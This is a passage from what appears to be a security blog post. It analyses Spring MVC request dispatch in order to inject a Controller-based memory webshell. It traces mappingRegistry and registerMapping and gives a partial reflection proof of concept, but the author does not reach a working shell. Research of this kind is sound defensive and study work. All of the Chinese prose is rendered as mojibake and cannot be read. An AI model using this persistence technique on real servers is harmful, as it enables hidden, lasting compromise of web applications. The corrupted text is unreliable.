</span></span><span class="line"><span class="cl">                <span class="nt">&lt;configuration&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;mainClass&gt;</span>org.example.springboot1.Springboot1Application<span class="nt">&lt;/mainClass&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;skip&gt;</span>true<span class="nt">&lt;/skip&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;/configuration&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;executions&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;execution&gt;</span>
</span></span><span class="line"><span class="cl">                        <span class="nt">&lt;id&gt;</span>repackage<span class="nt">&lt;/id&gt;</span>
</span></span><span class="line"><span class="cl">                        <span class="nt">&lt;goals&gt;</span>
</span></span><span class="line"><span class="cl">                            <span class="nt">&lt;goal&gt;</span>repackage<span class="nt">&lt;/goal&gt;</span>
</span></span><span class="line"><span class="cl">                        <span class="nt">&lt;/goals&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;/execution&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;/executions&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/plugins&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/build&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/project&gt;</span>
</span></span></code></pre></div><h1 id="controllerå†…å­˜é©¬">Controllerå†…å­˜é©¬<a hidden class="anchor" aria-hidden="true" href="#controllerå†…å­˜é©¬">#</a></h1>
<h2 id="0x02-åˆ†æ">0x02 åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#0x02-åˆ†æ">#</a></h2>
<p>demo1</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example.springboot1.controllers</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.GetMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">IndexController</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&#34;/test&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">index</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;index&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Welcome to the Spring Boot application!&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>å…ˆå»ºä¸€ä¸ªdemoï¼Œç„¶åè°ƒè¯•åˆ†æï¼Œç„¶ååˆ†æè°ƒç”¨æ ˆ</p>
<p><img loading="lazy" src="images/image-20241118163215905.png" alt="image-20241118163215905"  />
</p>
<p>çœ‹åˆ°<code>DispatcherServlet.java#doDispatch</code>ï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªåœ°æ–¹è‡ªå·±æ…¢æ…¢è°ƒ</p>
<p><img loading="lazy" src="images/image-20241118163321025.png" alt="image-20241118163321025"  />
</p>
<p>ä¸‹ä¸€æ­¥<code>ha.handle()</code>ä¸­<code>handler</code>å¯ä»¥çŸ¥é“<code>mappedHandler.getHandler()</code>æ˜¯å­˜å‚¨<code>HandlerMethod</code>çš„åŠä¸Šé¢çš„<code>demoå¯¹åº”çš„index()</code></p>
<p><code>ha.handle()</code>åé¢çš„è°ƒç”¨åŸºæœ¬ä¸Šå°±æ˜¯åå°„æ¥<code>è°ƒç”¨è¿™ä¸ªæ–¹æ³•</code>ï¼ˆdemoä¸­indexï¼‰</p>
<p><img loading="lazy" src="images/image-20241118163500793.png" alt="image-20241118163500793"  />
</p>
<p>å¾€ä¸Šç¿»codeçœ‹æˆ‘ä»¬çš„<code>ha</code>å’Œ<code>mappedHandler</code>æ€ä¹ˆæ¥çš„ï¼Œ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">mappedHandler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getHandler</span><span class="p">(</span><span class="n">processedRequest</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œå…¶å®å°±æ˜¯æ ¹æ®<code>requestè¯·æ±‚çš„è·¯å¾„</code>å»æ‰¾å¯¹åº”çš„<code>Handler</code>å’Œ<code>HandlerMethod</code>äº†</p>
<p><img loading="lazy" src="images/image-20241118164525047.png" alt="image-20241118164525047"  />
</p>
<p>è·Ÿè¿›<code>getHandler()</code>æ–¹æ³•</p>
<p>æˆ‘ä»¬**<code>/test</code>çš„<code>Handler</code>**åœ¨<code>RequestMappingHandlerMapping</code>è¿™ä¸ªmapå°±æ‰¾åˆ°äº†ï¼Œç»§ç»­è·Ÿè¿›<code>getHandler()</code>ï¼Œçœ‹æ˜¯æ€ä¹ˆæ‰¾åˆ°çš„</p>
<p><img loading="lazy" src="images/image-20241118164941822.png" alt="image-20241118164941822"  />
</p>
<p>è¿™é‡Œç»§ç»­è·Ÿè¿›<code>getHandlerInternal()</code>è¿™é‡Œä¸»è¦å…³æ³¨è¿™ä¸ª</p>
<blockquote>
<p>åé¢ä»£ç è¿˜ä¼š<code>handler</code>è¿›è¡Œ<code>å°è£…</code>ï¼Œ<strong>æ·»åŠ <code>æ‹¦æˆªå™¨Interceptor</code>è¿›å»</strong>ï¼Œä¸‹é¢è¿™æ®µä»£ç ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆæ”¾ç€ï¼Œåˆ°<code>Interceptorå†…å­˜é©¬</code>å†ç ”ç©¶ï¼ˆæˆ‘çŒœæµ‹åº”è¯¥æ˜¯è¿™æ ·ï¼‰</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">chain</span><span class="p">.</span><span class="na">addInterceptor</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">CorsInterceptor</span><span class="p">(</span><span class="n">config</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="k">return</span><span class="w"> </span><span class="n">chain</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20241118165123483.png" alt="image-20241118165123483"  />
</p>
<p><img loading="lazy" src="images/image-20241118165330084.png" alt="image-20241118165330084"  />
</p>
<p>å›å½’æ­£é¢˜ï¼Œç»§ç»­è·Ÿè¿›<code>super.getHandlerInternal</code></p>
<p><img loading="lazy" src="images/image-20241118170231520.png" alt="image-20241118170231520"  />
</p>
<p>å¯ä»¥çœ‹åˆ°<code>lookupPath</code>å¾—åˆ°è¯·æ±‚çš„<code>urlè·¯å¾„</code>ï¼Œç„¶å<code>lookupHandlerMethod</code>æ ¹æ®<code>urlè·¯å¾„</code>è·å–å¯¹åº”çš„<code>HandlerMethod</code></p>
<p><img loading="lazy" src="images/image-20241118170405168.png" alt="image-20241118170405168"  />
</p>
<p>è·Ÿè¿›<code>lookupHandlerMethod</code></p>
<p>ä¼šæ ¹æ®è¯·æ±‚çš„<code>urlè·¯å¾„</code>æ‰¾åˆ°å¯¹åº”çš„<code>Match</code>ï¼Œç„¶å<code>return HandlerMethod</code>ï¼ˆçœ‹ä¸‹å›¾ï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">return bestMatch.getHandlerMethod();
</span></span></code></pre></div><p><img loading="lazy" src="images/image-20241118170633979.png" alt="image-20241118170633979"  />
</p>
<p><img loading="lazy" src="images/image-20241118172055562.png" alt="image-20241118172055562"  />
</p>
<p><img loading="lazy" src="images/image-20241118171835034.png" alt="image-20241118171835034"  />
</p>
<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¤§æ¦‚çš„æ€è·¯å°±æ˜¯æ’å…¥ä¸€ä¸ª<code>Handler</code>ä»¥åŠ<code>HandlerMethod</code>ï¼Œç„¶åè¯·æ±‚å¯¹åº”urlå°±èƒ½è§¦å‘<code>HandlerMethod</code>ä¸­çš„<code>code</code>å®ç°å†…å­˜é©¬</p>
<h2 id="0x03-æ„é€ ">0x03 æ„é€ <a hidden class="anchor" aria-hidden="true" href="#0x03-æ„é€ ">#</a></h2>
<p>è¿™é‡Œæˆ‘ä»¬å†å†™ä¸€ä¸ª<code>API</code>ï¼Œçœ‹å“ªäº›å‚æ•°æœ‰å˜åŒ–ï¼Œå…å¾—ä¸€ä¸ªä¸ªå»è°ƒè¯•äº†</p>
<p><img loading="lazy" src="images/image-20241118172828187.png" alt="image-20241118172828187"  />
</p>
<p>æ ¹æ®å‰é¢çš„åˆ†æï¼Œurlè¯·æ±‚åˆ°è°ƒç”¨æ–¹æ³•ï¼Œèµ·ç‚¹è¿˜æ˜¯<code>mappedHandler = getHandler(processedRequest);</code>é‡Œé¢è·å–äº†åé¢è¦ç”¨åˆ°çš„å‚æ•°</p>
<p>çœ‹åˆ°<code>AbstractHandlerMethodMapping.java</code>çš„<code>this.mappingRegistry</code>è¿™ä¸ªå€¼å¤šäº†<code>/springez</code>è¿™å¯¹é”®å€¼ï¼Œé‚£æˆ‘ä»¬è‚¯å®šè¦åœ¨è¿™æ’å…¥æˆ‘ä»¬çš„<code>map</code>å‘€</p>
<p>åœ¨åé¢<code>lookupHandlerMethod()</code>æ–¹æ³•ä¸­ä¹Ÿæ˜¯é€šè¿‡<code>this.mappingRegistry</code>æ¥å¾—åˆ°<code>HandlerMethod</code></p>
<p><img loading="lazy" src="images/image-20241118173121265.png" alt="image-20241118173121265"  />
</p>
<p>ç„¶åæˆ‘ä»¬æŸ¥æ‰¾å“ªäº›åœ°æ–¹å¯¹<code>mappingRegistry</code>è¿™ä¸ªå€¼è¿›è¡Œäº†<code>èµ‹å€¼</code>ï¼Œè¿™é‡Œçœ‹åˆ°<code>registerMapping</code>å’Œ<code>registerHandlerMethod</code>éƒ½ä¼šè¿›è¡Œ<code>èµ‹å€¼</code>ã€‚</p>
<h3 id="èŠ‚ç‚¹1-åˆ é™¤handlerå†…å­˜é©¬">èŠ‚ç‚¹1 åˆ é™¤handlerå†…å­˜é©¬<a hidden class="anchor" aria-hidden="true" href="#èŠ‚ç‚¹1-åˆ é™¤handlerå†…å­˜é©¬">#</a></h3>
<p><code>unregisterMapping</code>åˆ™æ˜¯åˆ é™¤ï¼Œè¿™é‡Œå¯ä»¥ç”¨æ¥<code>åˆ é™¤handler</code>è¿™ç§å†…å­˜é©¬å‘€</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">registerMapping</span><span class="p">(</span><span class="n">T</span><span class="w"> </span><span class="n">mapping</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">logger</span><span class="p">.</span><span class="na">isTraceEnabled</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">logger</span><span class="p">.</span><span class="na">trace</span><span class="p">(</span><span class="s">&#34;Register \&#34;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">mapping</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\&#34; to &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">toGenericString</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">this</span><span class="p">.</span><span class="na">mappingRegistry</span><span class="p">.</span><span class="na">register</span><span class="p">(</span><span class="n">mapping</span><span class="p">,</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">method</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">unregisterMapping</span><span class="p">(</span><span class="n">T</span><span class="w"> </span><span class="n">mapping</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">logger</span><span class="p">.</span><span class="na">isTraceEnabled</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">logger</span><span class="p">.</span><span class="na">trace</span><span class="p">(</span><span class="s">&#34;Unregister mapping \&#34;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">mapping</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\&#34;&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">this</span><span class="p">.</span><span class="na">mappingRegistry</span><span class="p">.</span><span class="na">unregister</span><span class="p">(</span><span class="n">mapping</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">registerHandlerMethod</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">mapping</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">this</span><span class="p">.</span><span class="na">mappingRegistry</span><span class="p">.</span><span class="na">register</span><span class="p">(</span><span class="n">mapping</span><span class="p">,</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">method</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>åé¢åŸºæœ¬ä¸Šä¹Ÿæ˜¯å›´ç»•è¿™ä¸ª<code>mappingRegistry</code>å‚æ•°ï¼Œæˆ‘ä»¬æ‰“ä¸ªæ–­ç‚¹çœ‹ä¸‹<code>spring</code>æ˜¯æ€ä¹ˆæ·»åŠ ï¼Œ</p>
<p><code>spring</code>æ˜¯<strong>å¯åŠ¨çš„æ—¶å€™</strong>é€šè¿‡<code>registerHandlerMethod</code>æ·»åŠ çš„</p>
<p><img loading="lazy" src="images/image-20241119100447530.png" alt="image-20241119100447530"  />
</p>
<h2 id="é—®é¢˜1-ä¼ å‚">é—®é¢˜1 ä¼ å‚<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜1-ä¼ å‚">#</a></h2>
<p>è¿™é‡Œå¤§æ¦‚å°±ä¸¤ä¸ªé—®é¢˜å§ï¼Œä¸€ä¸ªæ˜¯<code>methodå’Œmapping</code>çš„ä¼ å‚é—®é¢˜ï¼Œè¿˜æœ‰ä¸€ä¸ªå°±æ˜¯æ€ä¹ˆè·å–åˆ°å¯¹åº”çš„<code>AbstractHandlerMethodMapping</code>ç±»</p>
<p>é€šè¿‡ç¿»æ‰¾è°ƒç”¨æ ˆå‘ç°<code>mapping</code>æ˜¯é€šè¿‡<code>getMappingForMethod()</code>è°ƒç”¨çš„ç»“æœï¼Œè¿™é‡Œè°ƒç”¨å‚æ•°</p>
<p><code>method</code>æ˜¯<code>å¯¹åº”controllerçš„æ–¹æ³•</code>ï¼ˆ<code>index()</code>ï¼‰ï¼Œ<code>userType</code>æ˜¯å¯¹åº”<code>controllerçš„Class</code>ï¼ˆ<code>org.example.springboot1.controllers.IndexController</code>ï¼‰</p>
<p><img loading="lazy" src="images/image-20241119111002735.png" alt="image-20241119111002735"  />
</p>
<p><strong>è§£å†³:</strong></p>
<p>è¿˜æ˜¯å»ç¿»æ‰¾**<code>è°ƒç”¨æ ˆ</code>**ï¼Œæ‰¾åˆ°<code>Method</code>å’Œ<code>mapping</code>æ˜¯æ€ä¹ˆæ„å»ºè·å¾—çš„ï¼Œçœ‹åˆ°<code>AbstractHandlerMethodMapping.java#detectHandlerMethods</code></p>
<p><img loading="lazy" src="images/image-20241119153752293.png" alt="image-20241119153752293"  />
</p>
<p>è¿™é‡Œ<code>MethodIntrospector.selectMethods()</code>ä¼šæ‰¾åˆ°<code>userTypeç›¸å…³ç±»</code>çš„<code>æ‰€æœ‰æ–¹æ³•</code>ï¼Œç„¶åæŠŠè¿™äº›æ–¹æ³•éƒ½ä¼ å…¥åˆ°<code>getMappingForMethod()</code>ä¸­è¿”å›<code>mapping</code></p>
<p>è·Ÿè¿›<code>MethodIntrospector.selectMethods()</code>ï¼Œåœ¨<code>doWithMethods()</code>å¯ä»¥å¾—åˆ°<code>æ€ä¹ˆè·å–Method</code>çš„</p>
<p><img loading="lazy" src="images/image-20241119154112720.png" alt="image-20241119154112720"  />
</p>
<p>è¿”å›åˆ°ä¸Šé¢<code>getMappingForMethod()</code>è·å–<code>mapping</code></p>
<p><img loading="lazy" src="images/image-20241119154427756.png" alt="image-20241119154427756"  />
</p>
<p>è¿™é‡Œå°±å¾ˆæ¸…æ¥šäº†</p>
<ol>
<li>
<p><code>getDeclaredMethods()</code>å¾—åˆ°<code>Methods</code></p>
</li>
<li>
<p><code>getMappingForMethod()</code>å¾—åˆ°<code>mapping</code></p>
</li>
</ol>
<p>æ³¨æ„è¿™é‡Œæ˜¯<code>getDeclaredMethods()</code>æ˜¯<code>org.springframework.util.ReflectionUtils</code>çš„æ–¹æ³•ï¼Œä»–è‡ªå·±å†™äº†ä¸€ä¸ªã€‚ä¸æ˜¯<code>Classé‚£ä¸ª</code></p>
<p><img loading="lazy" src="images/image-20241119154928819.png" alt="image-20241119154928819"  />
</p>
<h3 id="poc1">poc1<a hidden class="anchor" aria-hidden="true" href="#poc1">#</a></h3>
<p><code>pocé›å½¢</code>ï¼Œè¿™é‡Œå°±ç›´æ¥é€šè¿‡åå°„è·å–æ–¹æ³•è°ƒç”¨å§</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example.springboot1.controllers</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.GetMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.mvc.method.RequestMappingInfo</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestController</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&#34;ttee&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">ttee</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ttee&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;tteeeeeee&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//String userType = &#34;TestController&#34;;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.util.ReflectionUtils&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getDeclaredMethods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass1</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;getDeclaredMethods&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">getDeclaredMethods</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="o">[]</span><span class="w"> </span><span class="n">methods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="o">[]</span><span class="p">)</span><span class="w"> </span><span class="n">getDeclaredMethods</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">aClass1</span><span class="p">,</span><span class="w"> </span><span class="n">TestController</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">methods</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getMappingForMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;getMappingForMethod&#34;</span><span class="p">,</span><span class="n">Method</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">getMappingForMethod</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RequestMappingInfo</span><span class="w"> </span><span class="n">invoke</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RequestMappingInfo</span><span class="p">)</span><span class="w"> </span><span class="n">getMappingForMethod</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">RequestMappingHandlerMapping</span><span class="p">(),</span><span class="w"> </span><span class="n">methods</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">TestController</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">invoke</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h2 id="é—®é¢˜2-è·å–è¿è¡Œæ—¶ç±»å®ä¾‹">é—®é¢˜2 è·å–è¿è¡Œæ—¶ç±»å®ä¾‹<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜2-è·å–è¿è¡Œæ—¶ç±»å®ä¾‹">#</a></h2>
<p>è¿™é‡Œæˆ‘ä»¬registerè‚¯å®šå¾—<code>æ’å…¥</code>åˆ°<code>AbstractHandlerMethodMapping.java</code>æˆ–è€…<code>this.mappingRegistry</code>è¿è¡Œæ—¶å¯¹åº”çš„**<code>å®ä¾‹å¯¹è±¡æ‰è¡Œ</code>**å‘€</p>
<p><img loading="lazy" src="images/image-20241119155358394.png" alt="image-20241119155358394"  />
</p>
<p><strong>è§£å†³ï¼š</strong></p>
<p>è·Ÿè¸ªä¸Šé¢æåˆ°ä¸¤ä¸ªå€¼</p>
<p><img loading="lazy" src="images/image-20241119160439698.png" alt="image-20241119160439698"  />
</p>
<p>æˆæœåªçŸ¥é“<code>springå¯åŠ¨æ—¶</code>è¿™é‡Œ<code>RequestMappingHandlerMapping</code>é‡Œé¢æ”¾äº†<code>AbstractHandlerMethodMapping</code>å¾—åˆ°<code>RequestMappingHandlerMapping</code>å°±å¾—åˆ°äº†<code>AbstractHandlerMethodMapping</code></p>
<h4 id="å­˜æ¡£1-ä¸Šä¸‹æ–‡-no">å­˜æ¡£1 ä¸Šä¸‹æ–‡ no<a hidden class="anchor" aria-hidden="true" href="#å­˜æ¡£1-ä¸Šä¸‹æ–‡-no">#</a></h4>
<p>è¿™é‡Œæœ€åè¿˜æ˜¯æ²¡æ‰¾åˆ°æ€ä¹ˆè·å–ä¸Šä¸‹æ–‡ï¼Œæ„Ÿè§‰å…‰çœ‹è°ƒç”¨æ ˆæ‰¾ä¸å‡ºæ¥ï¼Œè¿™é‡Œæš‚æ—¶å…ˆå­˜ä¸ªæ¡£å§ï¼Œç­‰åé¢æ‡‚å¾—å¤šäº†å†æ¥è¡¥ã€‚</p>
<blockquote>
